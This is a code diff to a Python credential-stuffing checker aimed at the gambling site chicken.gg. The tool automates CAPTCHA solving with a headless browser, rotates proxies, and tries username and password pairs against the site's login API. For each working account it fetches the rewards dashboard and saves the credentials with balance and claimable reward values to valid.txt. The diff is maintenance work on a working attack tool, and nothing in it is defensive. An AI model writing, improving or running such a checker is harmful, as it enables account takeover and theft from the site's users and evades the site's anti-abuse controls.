@@ -93,7 +93,7 @@ class CaptchaSolver:
         self.loop = asyncio.new_event_loop()
         self.thread = threading.Thread(target=self._start_loop, daemon=True)
         self.thread.start()
-        self.page_pool = asyncio.Queue()
+        self.page_pool = None
         self.browser = None
         self.camoufox = None
         asyncio.run_coroutine_threadsafe(self._init_browser(), self.loop).result()
@@ -103,6 +103,7 @@ class CaptchaSolver:
         self.loop.run_forever()
 
     async def _init_browser(self):
+        self.page_pool = asyncio.Queue()
         self.camoufox = AsyncCamoufox(
             headless=True,
             exclude_addons=[DefaultAddons.UBO],
@@ -183,7 +184,7 @@ class CaptchaSolver:
             return
             
         async def shutdown():
-            tasks = [t for t in asyncio.all_tasks(self.loop) if t is not asyncio.current_task(self.loop)]
+            tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
             for task in tasks:
                 task.cancel()
             await asyncio.gather(*tasks, return_exceptions=True)
@@ -325,17 +326,23 @@ def load_proxies():
     for raw in raw_proxies:
         if "://" in raw:
             proxies.append(raw)
+        elif "@" in raw:
+            proxies.append(f"http://{raw}")
         else:
             parts = raw.split(":")
             if len(parts) == 4:
-                host, port, user, pwd = parts
-                proxies.append(f"http://{user}:{pwd}@{host}:{port}")
+                try:
+                    int(parts[1])
+                    host, port, user, pwd = parts
+                    proxies.append(f"http://{user}:{pwd}@{host}:{port}")
+                except ValueError:
+                    user, pwd, host, port = parts
+                    proxies.append(f"http://{user}:{pwd}@{host}:{port}")
             elif len(parts) == 2:
-                host, port = parts
-                proxies.append(f"http://{host}:{port}")
+                proxies.append(f"http://{parts[0]}:{parts[1]}")
             else:
                 proxies.append(f"http://{raw}")
-                
+
     return proxies
 
 def print_summary(total, threads, retries):
@@ -354,13 +361,14 @@ def get_captcha_token(solver, ui):
         ui.update_queue(-1)
 
 def try_login(username, password, captcha_token, proxy_dict):
+    session = requests.Session()
     payload = {"username": username, "password": password, "captchaToken": captcha_token}
     try:
-        resp = requests.post("https://api.chicken.gg/site/auth/local", json=payload, headers=HEADERS, proxies=proxy_dict, timeout=30)
+        resp = session.post("https://api.chicken.gg/site/auth/local", json=payload, headers=HEADERS, proxies=proxy_dict, timeout=30)
     except requests.RequestException as e:
         return {"success": False, "error": str(e), "retryable": True}
-        
-    try: 
+
+    try:
         body = resp.json()
         if not isinstance(body, dict):
             return {"success": False, "error": f"Unexpected JSON type: {type(body).__name__}", "retryable": True}
@@ -374,24 +382,30 @@ def try_login(username, password, captcha_token, proxy_dict):
         stats = user.get("stats", {})
         wagered = (stats.get("wagerAmount", 0) or 0) / 1000000
         level = xp_to_level(xp)
-        
-        offer_case_amount = (stats.get("offerCaseAmount", 0) or 0) / 1000000
-        quick = offer_case_amount * 0.0025
-        daily = offer_case_amount * 0.02
-        weekly = offer_case_amount * 0.10
-        monthly = offer_case_amount * 0.25
-        rankup = offer_case_amount * 0.15 if level >= 30 and level % 10 == 0 else 0.0
-        
+
+        rakeback_balance = 0
+        try:
+            rewards_resp = session.get("https://api.chicken.gg/site/rewards/dashboard", headers=HEADERS, proxies=proxy_dict, timeout=15)
+            if rewards_resp.status_code == 200:
+                rewards_body = rewards_resp.json()
+                rakeback_balance = (rewards_body.get("balance", 0) or 0) / 1000000
+        except Exception:
+            pass
+
+        quick = rakeback_balance * 0.0025
+        daily = rakeback_balance * 0.02
+        weekly = rakeback_balance * 0.10
+        monthly = rakeback_balance * 0.25
+
         return {
-            "success": True, 
-            "balance": balance, 
-            "wagered": wagered, 
-            "level": level, 
+            "success": True,
+            "balance": balance,
+            "wagered": wagered,
+            "level": level,
             "quick": quick,
             "daily": daily,
             "weekly": weekly,
             "monthly": monthly,
-            "rankup": rankup,
             "retryable": False
         }
         
@@ -422,7 +436,7 @@ def check_account(args, ui, solver, proxy_cycle, output_lock, max_retries):
         if result["success"]:
             t = time.time() - start_t
             log_valid(ui, username, result["balance"], result["wagered"], result["level"], t)
-            line = f"{username}:{password} | Balance = {result['balance']:.2f} | Wagered = {result['wagered']:.2f} | Level = {result['level']} | Quick = {result['quick']:.4f} | Daily = {result['daily']:.4f} | Weekly = {result['weekly']:.4f} | Monthly = {result['monthly']:.4f} | RankUp = {result['rankup']:.4f}"
+            line = f"{username}:{password} | Balance = {result['balance']:.2f} | Wagered = {result['wagered']:.2f} | Level = {result['level']} | Quick = {result['quick']:.4f} | Daily = {result['daily']:.4f} | Weekly = {result['weekly']:.4f} | Monthly = {result['monthly']:.4f}"
             with output_lock:
                 with open("valid.txt", "a", encoding="utf-8") as f:
                     f.write(line + "\n")
@@ -500,11 +514,12 @@ if __name__ == "__main__":
         print(f"\n  {RD}Ctrl+C detected during setup, exiting...{R}")
     finally:
         try:
-            devnull = open(os.devnull, 'w')
-            sys.stdout = devnull
-            sys.stderr = devnull
-            os.dup2(devnull.fileno(), 1)
-            os.dup2(devnull.fileno(), 2)
+            devnull_fd = os.open(os.devnull, os.O_WRONLY)
+            os.dup2(devnull_fd, 1)
+            os.dup2(devnull_fd, 2)
+            os.close(devnull_fd)
+            sys.stdout = open(os.devnull, 'w')
+            sys.stderr = sys.stdout
         except Exception:
             pass
         os._exit(0)
